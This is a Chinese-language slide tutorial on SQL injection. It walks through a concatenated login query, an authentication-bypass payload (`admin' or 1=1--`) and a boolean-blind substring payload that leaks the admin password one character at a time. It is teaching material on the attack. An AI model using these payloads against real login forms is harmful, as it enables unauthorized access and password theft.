
# SQL Injection

---

## 這啥

--

一種故意塞奇怪的內容讓別人的程式講錯話的手法

--

✋🌰

---

有聽過**棒球隊棒球隊**這個相聲橋段嘛

---

- 誰在一壘
- 什麼在二壘
- 三壘我不知道

---

當某些常用有特殊意義的字詞

混進句子裡的時候會造成的誤解

---

尤其是當你直接把別人給的資料

無條件加進 SQL query 的時候

--

好比說你要登入

你輸入了 帳號: admin 密碼: meow

假設拼出來的 SQL 指令長這樣

```sql
SELECT * from Users
  where user = 'admin' and password = md5('meow');
```

---

密碼不對啥都沒有

```text
 +----------+--------------------------------------+
 | user     | password                             |
 +----------+--------------------------------------+
 +----------+--------------------------------------+
```

--

字串是用單引號包的呢

那在參數裡加個 `'` 好了

帳號: `admin'` 密碼: meow

```sql
SELECT * from Users
  where user = 'admin'' and password = md5('meow');
```

---

上色爆炸啦

這行拿去跑會噴錯誤

> ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'meow')' at line 1

--

那如果說我們故意把他湊成有意義的呢

---

帳號: `admin' or 1=1--'` 密碼: meow

```sql
SELECT * from Users
  where user = 'admin' or 1=1--' and password = md5('meow');
```

---

OOPS

```text
 +----------+--------------------------------------+
 | user     | password                             |
 +----------+--------------------------------------+
 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99     |
 +----------+--------------------------------------+
```

---

這是最基本的邏輯注入

讓他選出 admin 的資料

--

或者偷看某個東西對不對

其實 sql 指令的結果可以當成別的東西的參數

---

帳號: `admin' or substring((select password from Users where user = 'admin' limit 1),1,1)='a'--'`

密碼: meow

```sql
SELECT * from Users
  where user = 'admin' or substring((select password from Users where user = 'admin' limit 1),1,1)='a'--' and password = md5('meow');
```

---

如果過了

代表 `admin` 的 `password` 那一欄第一個字元是 `a` 或 `A`
